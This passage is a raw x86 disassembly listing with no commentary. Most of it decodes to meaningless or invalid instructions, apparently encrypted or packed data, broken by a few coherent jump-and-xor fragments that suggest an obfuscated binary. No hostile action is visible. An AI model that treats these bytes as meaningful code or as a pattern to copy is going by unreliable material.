  4019a3:	push   0xd4480b60
  4019a8:	icebp  
  4019a9:	ins    BYTE PTR es:[edi],dx
  4019aa:	inc    esp
  4019ab:	pop    ebx
  4019ac:	into   
  4019ad:	jmp    0x4019b3
  4019af:	sbb    dl,dl
  4019b1:	push   esp
  4019b2:	jecxz  0x4019f8
  4019b4:	sbb    dh,BYTE PTR [ebp-0x34d960bb]
  4019ba:	add    BYTE PTR [ebp+0x2b],0x3c
  4019be:	in     eax,0x90
  4019c0:	push   esi
  4019c1:	sbb    eax,0xecf98868
  4019c6:	std    
  4019c7:	mov    ch,0x33
  4019c9:	push   edi
  4019ca:	aaa    
  4019cb:	mov    al,ds:0x9bd3f9da
  4019d0:	or     ebx,DWORD PTR [ebx+0x3e]
  4019d3:	sub    eax,0xc2d13edd
  4019d8:	popf   
  4019d9:	sub    al,dh
  4019db:	adc    BYTE PTR [ebx-0x2f],bl
  4019de:	aas    
  4019df:	sub    esi,DWORD PTR [esi-0xc]
  4019e2:	xchg   edi,eax
  4019e3:	rcl    BYTE PTR [eax-0x16e6a929],cl
  4019e9:	xchg   BYTE PTR [esp+edi*1],cl
  4019ec:	dec    edx
  4019ed:	and    ecx,edx
  4019ef:	fwait
  4019f0:	push   cs
  4019f1:	lock mov ds:0x9b6e0925,al
  4019f7:	fwait
  4019f8:	add    eax,0x48cb51d7
  4019fd:	xchg   ebx,eax
  4019fe:	js     0x401a60
  401a00:	cmc    
  401a01:	dec    ecx
  401a02:	icebp  
  401a03:	repz or al,0xcd
  401a06:	mov    ecx,0xebe0c078
  401a0b:	and    eax,0xec35c92f
  401a10:	repz add ch,BYTE PTR [ebx-0x4e]
  401a14:	jmp    0x2cfdd710
  401a19:	and    eax,DWORD PTR [edi]
  401a1b:	dec    esi
  401a1c:	(bad)  
  401a1d:	in     eax,dx
  401a1e:	xchg   edx,eax
  401a1f:	call   0xb70b749d
  401a24:	sub    al,0x60
  401a26:	push   esi
  401a27:	imul   edx,DWORD PTR [esi],0x11
  401a2a:	mov    cl,0xb6
  401a2c:	imul   eax,DWORD PTR [ebp-0x4068792f],0x49
  401a33:	gs jg  0x4019d1
  401a36:	mov    edx,0xfffd2e
  401a3b:	dec    eax
  401a3c:	addr16 jo 0x401a5f
  401a3f:	mov    DWORD PTR [ecx],ebp
  401a41:	add    BYTE PTR [esi+0x4e593722],ah
  401a47:	jge    0x401a5b
  401a49:	jns    0x401a12
  401a4b:	sub    eax,0x785a4062
  401a50:	mov    ecx,0x8b0f9cfa
  401a55:	loope  0x401a35
  401a57:	pop    edi
  401a58:	(bad)  
  401a59:	xchg   edi,eax
  401a5a:	into   
  401a5b:	sub    eax,0x918f6e2e
  401a60:	inc    cx
  401a62:	fdivr  DWORD PTR [ecx+0x3d103b6d]
  401a68:	ret    
  401a69:	loop   0x401ac3
  401a6b:	mov    dl,0xb9
  401a6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a6e:	sbb    esp,DWORD PTR [ebp+0x5a]
  401a71:	push   0x14
  401a73:	(bad)  
  401a75:	jmp    0xb09da3b8
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	xor    ecx,ecx
  401a8d:	sub    dh,BYTE PTR [ebp+0xe]
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401af2
  401a98:	test   al,0x8c
  401a9a:	adc    esi,ebp
  401a9c:	xchg   ecx,eax
  401a9d:	js     0x401aa8
  401a9f:	adc    eax,0xf1517c1b
  401aa4:	aam    0xf8
  401aa6:	mov    ecx,0x75dddfd8
  401aab:	loope  0x401a3f
  401aad:	jp     0x401ac2
  401aaf:	xor    dh,bl
  401ab1:	lods   al,BYTE PTR ds:[esi]
  401ab2:	jmp    0xe87:0x8eef5dfa
  401ab9:	mov    al,0x4e
  401abb:	(bad)  
  401abc:	fsub   st(6),st
  401abe:	int    0x4
  401ac0:	mov    ?,WORD PTR [esi-0x4f]
  401ac3:	in     eax,0xe3
  401ac5:	nop
  401ac6:	push   ss
  401ac7:	scas   eax,DWORD PTR es:[edi]
  401ac8:	call   0x451889a6
  401acd:	lods   eax,DWORD PTR ds:[esi]
  401ace:	(bad)  
  401acf:	pop    ebp
  401ad0:	add    ch,bl
  401ad2:	icebp  
  401ad3:	mov    eax,ds:0xc19e2b04
  401ad8:	mov    ?,WORD PTR [esi+0x2b15dbb8]
  401ade:	xor    BYTE PTR [ebx+0x14],ah
  401ae1:	icebp  
  401ae2:	dec    edi
  401ae3:	(bad)  
  401ae4:	mov    edi,0xe321816b
  401ae9:	jo     0x401aba
  401aeb:	pop    esp
  401aec:	cwde   
  401aed:	and    ecx,DWORD PTR [esi+0x7e33f83c]
  401af3:	cmp    BYTE PTR [ebx],ch
  401af5:	mov    bh,0x4e
  401af7:	(bad)  
  401af9:	add    al,0x77
  401afb:	mov    dh,BYTE PTR [eax-0x10]
  401afe:	mov    eax,ds:0x6fa00209
  401b03:	fnstcw WORD PTR ds:0xab840cc4
  401b09:	enter  0xbd0f,0x71
  401b0d:	icebp  
  401b0e:	(bad)
  401b12:	retf   0xd9d9
  401b15:	mov    fs,WORD PTR [edi+0x6b]
  401b18:	popf   
  401b19:	cmp    eax,0xe09f663b
  401b1e:	mov    gs,ebp
  401b20:	cmp    ebx,DWORD PTR [ecx-0x38e30c01]
  401b26:	jbe    0x401ad4
  401b28:	jb     0x401aac
  401b2a:	stc    
  401b2b:	push   0xe852e6d7
  401b30:	sub    eax,0x87789072
  401b35:	ret    0xcd3
  401b38:	cmp    BYTE PTR [ecx-0x1],ch
  401b3b:	in     al,dx
  401b3c:	adc    ebx,DWORD PTR [ebx+0x3c55d22b]
  401b42:	xchg   DWORD PTR [ebp+eiz*8+0xe],esp
  401b46:	adc    BYTE PTR [ebx],al
  401b48:	cmp    eax,0xcfbbab4c
  401b4d:	or     ebp,eax
  401b4f:	or     al,0x71
  401b51:	xchg   DWORD PTR [edi+eax*4],ebp
  401b54:	jmp    0x3187:0x49da219e
  401b5b:	es daa 
  401b5d:	test   eax,0x1801380a
  401b62:	add    dl,BYTE PTR [ecx]
  401b64:	jnp    0x401aef
  401b66:	test   BYTE PTR [ecx],0x2
  401b69:	fstp   QWORD PTR [edi-0x504a73fe]
  401b6f:	jnp    0x401bd6
  401b71:	(bad)  
  401b72:	add    DWORD PTR [ebp+0x27],0xfeb82bd7
  401b79:	adc    eax,0xcb45c24e
  401b7e:	and    ch,BYTE PTR [edx-0x26517cfb]
  401b84:	in     eax,0xa8
  401b86:	(bad)  
  401b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b88:	jge    0x401bfd
  401b8a:	sub    cl,BYTE PTR [ecx+0x792adf24]
  401b90:	inc    ecx
  401b91:	xchg   esi,eax
  401b92:	repz clc 
  401b94:	(bad)  
  401b95:	jno    0x401b87
  401b97:	mov    esi,0x5dc273ff
  401b9c:	stos   BYTE PTR es:[edi],al
  401b9d:	ds ret 
  401b9f:	ss mov ebx,0x9ea35056
  401ba5:	or     al,0x8a
  401ba7:	out    dx,eax
  401ba8:	jno    0x401b79
  401baa:	cmp    edi,esi
  401bac:	jnp    0x401ba6
  401bae:	fisub  DWORD PTR [ecx+0x57]
  401bb1:	jl     0x401b75
  401bb3:	mov    esi,0x5cadb11
  401bb8:	repnz xor eax,edi
  401bbb:	pushf  
  401bbc:	jmp    0x91fde3b3
  401bc1:	jo     0x401c30
  401bc3:	jns    0x401b5d
  401bc5:	hlt    
  401bc6:	mov    cl,BYTE PTR [edx]
  401bc8:	stc    
  401bc9:	dec    esi
  401bca:	pop    ss
  401bcb:	jo     0x401c1a
  401bcd:	push   0xa5922be
  401bd2:	push   edi
  401bd3:	sbb    esp,DWORD PTR [ebp+0x6120c8b5]
  401bd9:	pop    esi
  401bda:	adc    bl,0xe7
  401bdd:	sti    
  401bde:	push   edi
  401bdf:	xor    al,0xa
  401be1:	addr16 ret 0x53bd
  401be5:	inc    eax
  401be6:	pop    ecx
  401be7:	sbb    eax,0x1fcd6532
  401bec:	ss cwde 
  401bee:	sub    BYTE PTR [edx+0x11df8770],al
  401bf4:	jae    0x401c33
  401bf6:	xchg   ebx,eax
  401bf7:	hlt    
  401bf8:	mov    DWORD PTR [ebx],esi
  401bfa:	sub    esi,DWORD PTR [ecx+0x637da937]
  401c00:	imul   ecx,esi,0x34365061
  401c06:	shr    DWORD PTR [ebp-0x58235e17],cl
  401c0c:	inc    edi
  401c0d:	mov    ebx,DWORD PTR [edi-0x3f]
  401c10:	xor    al,0xc2
  401c12:	fwait
  401c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c14:	ins    BYTE PTR es:[edi],dx
  401c15:	not    DWORD PTR [edx]
  401c17:	sbb    BYTE PTR [edx+0x458bbae6],0xb0
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	mov    al,0xa2
  401c42:	inc    ecx
  401c43:	mov    al,ds:0x7e7e798a
  401c48:	cli    
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401bd7
  401c4d:	inc    esi
  401c4e:	xor    al,0x7b
  401c50:	adc    DWORD PTR [esi+0x41],ecx
  401c53:	(bad)  [edi-0x49]
  401c56:	xor    cl,BYTE PTR [edi]
  401c58:	popa   
  401c59:	lock mov ah,0x31
  401c5c:	jno    0x401bf2
  401c5e:	mov    ebp,0xfa762bd2
  401c63:	stc    
  401c64:	add    BYTE PTR [esi],bl
  401c66:	js     0x401c97
  401c68:	dec    edx
  401c69:	sub    al,0x6b
  401c6b:	push   0x4b
  401c6d:	(bad)  
  401c6e:	xchg   ebx,eax
  401c6f:	mov    ?,WORD PTR [edx]
  401c71:	jp     0x401c45
  401c73:	xchg   edi,eax
  401c74:	dec    esp
  401c75:	cwde   
  401c76:	inc    esp
  401c77:	push   0xd0977e10
  401c7c:	test   dl,al
  401c7e:	push   ecx
  401c7f:	jg     0x401d00
  401c81:	and    eax,0x2b5855d4
  401c86:	mov    ah,0x74
  401c88:	aam    0x9c
  401c8a:	mov    ss,edi
  401c8c:	mov    bl,0x99
  401c8e:	cmp    ch,BYTE PTR [ecx-0x2f4a7914]
  401c94:	jmp    0x36d7a346
  401c99:	ja     0x401c85
  401c9b:	sub    esi,esi
  401c9d:	jl     0x401d19
  401c9f:	or     ecx,DWORD PTR [eax-0x3104b7ae]
  401ca5:	mov    ah,dh
  401ca7:	pushf  
  401ca8:	jbe    0x401cfc
  401caa:	sar    BYTE PTR [eax+0x4b557170],cl
  401cb0:	aad    0x5c
  401cb2:	cdq    
  401cb3:	stos   BYTE PTR es:[edi],al
  401cb4:	jno    0x401c40
  401cb6:	pushf  
  401cb7:	push   edx
  401cb8:	(bad)  
  401cba:	pop    ss
  401cbb:	arpl   WORD PTR [ebx],di
  401cbd:	(bad)  
  401cbe:	xlat   BYTE PTR ds:[ebx]
  401cbf:	popa   
  401cc0:	(bad)  
  401cc1:	sar    DWORD PTR [eax],1
  401cc3:	add    BYTE PTR [ebx-0x3b418269],al
  401cc9:	add    al,0xfa
  401ccb:	addr16 js 0x401c8f
  401cce:	cmp    esi,DWORD PTR [edx-0x56]
  401cd1:	or     DWORD PTR [edx+ebp*4-0xd],esi
  401cd5:	out    0x2a,eax
  401cd7:	xlat   BYTE PTR ds:[ebx]
  401cd8:	and    eax,0xc4f8d49
  401cdd:	aam    0xf4
  401cdf:	xchg   edx,eax
  401ce0:	xchg   edi,eax
  401ce1:	or     ebp,DWORD PTR [esi]
  401ce3:	mov    esi,0xac767438
  401ce8:	imul   esp,DWORD PTR [ebx],0xceaea511
  401cee:	push   ecx
  401cef:	jns    0x401d13
  401cf1:	and    ah,cl
  401cf3:	push   esp
  401cf4:	jge    0x401cf6
  401cf6:	icebp  
  401cf7:	(bad)  
  401cf8:	jp     0x401cc7
  401cfa:	retf   
  401cfb:	pop    ebp
  401cfc:	dec    ebp
  401cfd:	out    0x0,al
  401cff:	pop    esi
  401d00:	ja     0x401d7c
  401d02:	out    dx,eax
  401d03:	sar    edx,0x4a
  401d06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d08:	mov    ds:0x7b27cd6c,al
  401d0d:	mul    DWORD PTR [edi+0xb]
  401d10:	sbb    eax,0xd20f3f88
  401d15:	out    dx,al
  401d16:	xchg   edi,eax
  401d17:	out    0x55,eax
  401d19:	sbb    al,BYTE PTR [ecx-0x74]
  401d1c:	mov    edi,0x51479d2e
  401d21:	jp     0x401d3b
  401d23:	je     0x401cd6
  401d25:	mov    al,BYTE PTR [esi-0x2]
  401d28:	ja     0x401d5a
  401d2a:	or     dl,dl
  401d2c:	fst    QWORD PTR [ebp+0x11]
  401d2f:	lahf   
  401d30:	(bad)  
  401d31:	jecxz  0x401cf2
  401d33:	popa   
  401d34:	ds mov bh,0x3a
  401d37:	xchg   DWORD PTR [esi+0x39c802c2],esp
  401d3d:	jno    0x401da0
  401d3f:	repnz (bad)
  401d42:	loop   0x401d0e
  401d44:	cwde   
  401d45:	nop
  401d46:	inc    esi
  401d47:	loopne 0x401db7
  401d49:	cmp    edx,DWORD PTR [ecx+ecx*1-0x38627edf]
  401d50:	mov    eax,ds:0x6c7a1795
  401d55:	cmp    esp,DWORD PTR [edx+0x22]
  401d58:	jmp    0x490d1895
  401d5d:	add    DWORD PTR [eax],esi
  401d5f:	rcr    dh,cl
  401d61:	call   0x6a180100
  401d66:	cmp    BYTE PTR [esi+0x27e371a5],dh
  401d6c:	pop    ebp
  401d6d:	xor    eax,0xf8813bc9
  401d72:	nop
  401d73:	mov    bh,0xf2
  401d75:	popf   
  401d76:	cwde   
  401d77:	sub    al,0x30
  401d79:	ins    BYTE PTR es:[edi],dx
  401d7a:	clc    
  401d7b:	icebp  
  401d7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d7d:	psubusw mm2,mm7
  401d80:	jge    0x401d22
  401d82:	imul   ebx,DWORD PTR [edx-0x560473a5],0x7c3ed2b6
  401d8c:	retf   
  401d8d:	sub    BYTE PTR [edi],al
  401d8f:	sar    BYTE PTR [ebp-0x30],cl
  401d92:	mov    cl,0x7b
  401d94:	mov    ebp,0xf58a5759
  401d99:	(bad)  
  401d9a:	fimul  DWORD PTR [ecx]
  401d9c:	(bad)  
  401d9d:	push   ebx
  401d9e:	xor    ah,bh
  401da0:	sub    eax,0x761fb5c7
  401da5:	inc    ecx
  401da6:	pop    ss
  401da7:	xlat   BYTE PTR ds:[ebx]
  401da8:	test   DWORD PTR [edx-0x2],0xa8eb397c
  401daf:	out    dx,eax
  401db0:	mov    ds:0x4ce367b,al
  401db5:	mov    esp,0x3bd772cd
  401dba:	pop    ecx
  401dbb:	pop    ss
  401dbc:	outs   dx,DWORD PTR ds:[esi]
  401dbd:	stos   BYTE PTR es:[edi],al
  401dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dbf:	push   es
  401dc0:	pop    ebp
  401dc1:	and    esi,DWORD PTR [edx]
  401dc3:	mov    dh,0xda
  401dc5:	aas    
  401dc6:	test   eax,0xee85aca3
  401dcb:	dec    esp
  401dcc:	xor    eax,0x3d06834
  401dd1:	(bad)  
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x23ce05c8],ebp
  401e0d:	pop    edi
  401e0e:	push   ss
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e57
  401e17:	and    eax,0x7da370e9
  401e1c:	inc    eax
  401e1d:	fbld   TBYTE PTR [ebx+0x71653183]
  401e23:	inc    edi
  401e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e25:	or     bh,BYTE PTR [edx]
  401e27:	xchg   esi,eax
  401e28:	retf   0x6bc5
  401e2b:	pop    es
  401e2c:	popa   
  401e2d:	mov    dl,0x55
  401e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e30:	stc    
  401e31:	mov    ch,0x84
  401e33:	mov    dl,ch
  401e35:	mov    cl,0xb4
  401e37:	loope  0x401e7f
  401e39:	jo     0x401e30
  401e3b:	sbb    DWORD PTR [edx],ebp
  401e3d:	sar    BYTE PTR [esi+edi*2+0x428deca0],cl
  401e44:	js     0x401e53
  401e46:	mov    ecx,0xf3cdd9e0
  401e4b:	mov    BYTE PTR [edx+0x29400cd3],dl
  401e51:	jp     0x401df4
  401e53:	jbe    0x401ecc
  401e55:	scas   al,BYTE PTR es:[edi]
  401e56:	cwde   
  401e57:	xor    DWORD PTR ds:[edx+eiz*8],0xa528aaaa
  401e5f:	test   al,0x57
  401e61:	push   0x8214ebdd
  401e66:	std    
  401e67:	inc    ebp
  401e68:	(bad)  
  401e69:	in     al,dx
  401e6a:	cld    
  401e6b:	sub    esp,DWORD PTR [esi-0x62]
  401e6e:	inc    edi
  401e6f:	fisttp WORD PTR [edx-0x43]
  401e72:	sbb    eax,0xbbc48856
  401e77:	cli    
  401e78:	sub    dh,BYTE PTR [edx+0x32]
  401e7b:	cdq    
  401e7c:	retf   0xad11
  401e7f:	mov    bh,0xc2
  401e81:	xchg   esi,eax
  401e82:	xchg   edi,eax
  401e83:	dec    ecx
  401e84:	enter  0x4721,0xc0
  401e88:	(bad)  
  401e89:	sub    eax,0xffdb6fe3
  401e8e:	aam    0x1e
  401e90:	mov    fs,ecx
  401e92:	fcom   QWORD PTR [edx-0x62]
  401e95:	dec    esp
  401e96:	mov    DWORD PTR [edi-0x7560936a],esi
  401e9c:	rcr    BYTE PTR [edx+0xf6feb87],0x16
  401ea3:	enter  0x6946,0xc2
  401ea7:	inc    ecx
  401ea8:	add    esi,ecx
  401eaa:	mov    cl,cl
  401eac:	loope  0x401ec5
  401eae:	adc    BYTE PTR [eax],0x9b
  401eb1:	outs   dx,BYTE PTR ds:[esi]
  401eb2:	fcom   st(0)
  401eb4:	xor    esi,DWORD PTR [ecx+0x40]
  401eb7:	cmp    al,0xba
  401eb9:	mov    bl,0xa3
  401ebb:	add    eax,0x6ceb9396
  401ec0:	push   es
  401ec1:	dec    edx
  401ec2:	aas    
  401ec3:	sbb    esi,DWORD PTR [eax-0x6]
  401ec6:	aam    0xa4
  401ec8:	out    dx,al
  401ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401eca:	push   esi
  401ecb:	push   esi
  401ecc:	rol    BYTE PTR [ebx-0x53218ec4],1
  401ed2:	out    dx,al
  401ed3:	mov    ch,0x8
  401ed5:	jmp    0x4266:0xa227caa7
  401edc:	xor    al,BYTE PTR [eax]
  401ede:	outs   dx,DWORD PTR ds:[esi]
  401edf:	js     0x401ee2
  401ee1:	add    BYTE PTR [edi],bl
  401ee3:	dec    BYTE PTR [eax-0x58615f83]
  401ee9:	aam    0x95
  401eeb:	push   esp
  401eec:	mov    esp,0x83d603c0
  401ef1:	test   eax,0xea3ed056
  401ef6:	out    0xce,eax
  401ef8:	jp     0x401f4a
  401efa:	loope  0x401f39
  401efc:	or     esi,DWORD PTR [edx+0x4a0dd4cd]
  401f02:	jmp    0x401f2a
  401f04:	(bad)  
  401f05:	sahf   
  401f06:	adc    eax,0xd272a4f6
  401f0b:	repnz xor bl,BYTE PTR [esi*2+0x9018b16]
  401f13:	(bad)  
  401f15:	jae    0x401eab
  401f17:	cld    
  401f18:	dec    esp
  401f19:	mov    ch,0x49
  401f1b:	rcr    DWORD PTR [ebp+ecx*1+0x350431ec],1
  401f22:	fcmovb st,st(6)
  401f24:	or     DWORD PTR [ecx+0xb5dee17],ecx
  401f2a:	adc    ch,al
  401f2c:	sbb    edi,DWORD PTR [eax]
  401f2e:	test   al,0x1d
  401f30:	xchg   esi,eax
  401f31:	fild   WORD PTR [ecx+eiz*2-0x68c36068]
  401f38:	aad    0x33
  401f3a:	popf   
  401f3b:	inc    esi
  401f3c:	test   DWORD PTR [edx+0x3f],esi
  401f3f:	icebp  
  401f40:	retf   
  401f41:	mov    DWORD PTR [ebx-0x20ed9d4f],esi
  401f47:	sub    BYTE PTR [ebx],cl
  401f49:	mov    eax,0xd6a41cba
  401f4e:	pusha  
  401f4f:	sbb    DWORD PTR [ecx+eiz*1],ecx
  401f52:	dec    edi
  401f53:	ja     0x401f65
  401f55:	imul   edi,DWORD PTR [edx+eiz*8],0x974afceb
  401f5c:	mov    ch,0x48
  401f5e:	shl    BYTE PTR [edx+0x27],0xcc
  401f62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f63:	xchg   esp,eax
  401f64:	mov    al,ds:0x90ae4604
  401f69:	pop    ebx
  401f6a:	clc    
  401f6b:	jp     0x401f27
  401f6d:	mov    ebp,0x9d87a661
  401f72:	ss jne 0x401fde
  401f75:	outs   dx,BYTE PTR ds:[esi]
  401f76:	sbb    ebp,DWORD PTR [ebx+0x64a38f90]
  401f7c:	cmp    cl,BYTE PTR [ecx+0x57fa4225]
  401f82:	enter  0xa123,0x13
  401f86:	pop    eax
  401f87:	fld    QWORD PTR [ebx+0x42]
  401f8a:	sub    al,0x93
  401f8c:	gs (bad) 
  401f8e:	pop    ds
  401f8f:	shr    DWORD PTR [eax],1
  401f91:	sub    BYTE PTR [eax+0x3f3b632d],bh
  401f97:	sbb    ecx,DWORD PTR [ebx+eax*8]
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x68efe7a4
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f4d
  401fcc:	sbb    DWORD PTR [esi-0x50],ebx
  401fcf:	mov    ecx,0xa374d0c4
  401fd4:	es ds mov dl,0x82
  401fd8:	pop    ds
  401fd9:	jl     0x401f87
  401fdb:	int3   
  401fdc:	fs cmp bh,0xc
  401fe0:	loopne 0x401fb0
  401fe2:	aad    0x8d
  401fe4:	push   ss
  401fe5:	mov    ch,0xcc
  401fe7:	or     cl,ch
  401fe9:	or     bh,BYTE PTR [ecx-0x72]
  401fec:	jle    0x401f75
  401fee:	adc    eax,0x6dd0d0c
  401ff3:	ins    BYTE PTR es:[edi],dx
  401ff4:	ins    DWORD PTR es:[edi],dx
  401ff5:	lock fmul st,st(4)
  401ff8:	mov    edx,0xb9c41fa3
  401ffd:	and    dh,BYTE PTR [ebp-0x48]
  402000:	arpl   bx,bp
  402002:	ss cmp eax,0x383935be
  402008:	jb     0x401fa0
  40200a:	mov    eax,0x65710c8a
  40200f:	clc    
  402010:	mov    ecx,0xa1ac8192
  402015:	sbb    dl,BYTE PTR [esi+ebp*1-0x12]
  402019:	sub    al,0xce
  40201b:	in     al,dx
  40201c:	test   BYTE PTR [ecx+eiz*4+0x7e],dh
  402020:	and    eax,0x8345b7d9
  402025:	or     BYTE PTR [esi+0x23],0xb5
  402029:	adc    al,0xc2
  40202b:	repnz mov ebx,0xe99ff54b
  402032:	inc    ebp
  402033:	pushf  
  402034:	popf   
  402035:	fwait
  402036:	jmp    0xe8f45d47
  40203b:	mov    dh,bl
  40203d:	cmc    
  40203e:	jp     0x402093
  402040:	pop    esi
  402041:	dec    edx
  402042:	adc    ch,BYTE PTR [ecx-0x74]
  402045:	sbb    dl,BYTE PTR [ebp+edi*4+0x12]
  402049:	xchg   ebp,eax
  40204a:	inc    ebp
  40204b:	das    
  40204c:	lds    ecx,FWORD PTR [edi]
  40204e:	jp     0x401fff
  402050:	in     eax,dx
  402051:	push   ss
  402052:	dec    ebx
  402053:	fdiv   st,st(4)
  402055:	bound  eax,QWORD PTR [eax-0x38c656a5]
  40205b:	adc    eax,0x3cfea389
  402060:	mov    WORD PTR [ecx+0x4b],gs
  402063:	jnp    0x401ffd
  402065:	jmp    0x4020a8
  402067:	addr16 out dx,al
  402069:	mov    ds:0x6a265290,al
  40206e:	bound  ecx,QWORD PTR ds:0x693b825f
  402074:	mov    edx,0x5dce2638
  402079:	es mov esi,0xb09d9ae
  40207f:	jmp    0x7f49:0x64ba1519
  402086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402088:	sahf   
  402089:	sbb    BYTE PTR [edx+esi*2-0x3b26075a],ah
  402090:	push   ecx
  402091:	cmp    al,0x93
  402093:	out    0x3d,eax
  402095:	mov    DWORD PTR [eax+ebp*2-0x49397e9b],edx
  40209c:	jp     0x4020c9
  40209e:	sbb    edi,DWORD PTR [edi+0x6b]
  4020a1:	pop    ss
  4020a2:	cmp    ch,BYTE PTR [esi+0x79]
  4020a5:	leave  
  4020a6:	sub    ch,ch
  4020a8:	jl     0x402084
  4020aa:	aad    0xb9
  4020ac:	cmp    BYTE PTR [eax-0x21],ah
  4020af:	mov    ebx,0xe87c1a59
  4020b4:	sub    DWORD PTR [ebx-0x5eee9327],edx
  4020ba:	mov    eax,0x7c0821a1
  4020bf:	sub    eax,0x8ddc33bb
  4020c4:	iret   
  4020c5:	push   ebp
  4020c6:	xchg   edx,eax
  4020c7:	sahf   
  4020c8:	xor    DWORD PTR [edx],esi
  4020ca:	fwait
  4020cb:	test   BYTE PTR [edx+0x10],ch
  4020ce:	mov    dh,bl
  4020d0:	pop    ds
  4020d1:	mov    dh,BYTE PTR [edi]
  4020d3:	std    
  4020d4:	sub    DWORD PTR [edx],esp
  4020d6:	or     al,0x37
  4020d8:	mov    edx,0x94f018f5
  4020dd:	xor    al,0xaf
  4020df:	out    0xb4,eax
  4020e1:	and    al,0xd5
  4020e3:	mov    esi,0x46f3efb8
  4020e8:	xor    eax,0x79c5fd7a
  4020ed:	xor    BYTE PTR [edi+0x2c],ah
  4020f0:	test   eax,0x820b9473
  4020f5:	fild   DWORD PTR [edi-0x4f]
  4020f8:	jnp    0x402110
  4020fa:	jge    0x4020fb
  4020fc:	fbld   TBYTE PTR [esi-0x3159fae9]
  402102:	jo     0x402102
  402104:	cdq    
  402105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402106:	add    ebx,DWORD PTR [ebx-0x70]
  402109:	mov    dh,0x4a
  40210b:	or     DWORD PTR [eax+0x1a],eax
  40210e:	scas   eax,DWORD PTR es:[edi]
  40210f:	inc    edx
  402110:	call   0x9e179928
  402115:	and    BYTE PTR [edi+0x524a583],bl
  40211b:	push   ebx
  40211c:	xchg   esi,eax
  40211d:	je     0x4020f6
  40211f:	dec    eax
  402120:	adc    al,0x4
  402122:	int3   
  402123:	dec    ebx
  402124:	add    BYTE PTR [eax-0x78],0x70
  402128:	adc    BYTE PTR [ebx+ecx*1-0x6f9264e8],ah
  40212f:	pop    ecx
  402130:	imul   esi,DWORD PTR [esi+0x3c],0xffffffb8
  402134:	dec    esi
  402135:	mov    WORD PTR [edi-0x2],ss
  402138:	lock xchg edx,eax
  40213a:	mov    ecx,0x38d226a8
  40213f:	inc    esi
  402140:	(bad)  
  402141:	push   ss
  402142:	cmp    ebx,DWORD PTR [edx]
  402144:	or     al,0x42
  402146:	cmp    eax,0xae15d17f
  40214b:	inc    edx
  40214c:	dec    edi
  40214d:	adc    al,0x1c
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	dec    ebx
  40216a:	mov    ebp,0x21ee554
  40216f:	jle    0x4021ef
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x402169
  402176:	adc    BYTE PTR [ecx+0x4c],dh
  402179:	add    eax,0x14c6a4a
  40217e:	pop    ebp
  40217f:	or     DWORD PTR [ebx+0x7f],eax
  402182:	jno    0x4021a3
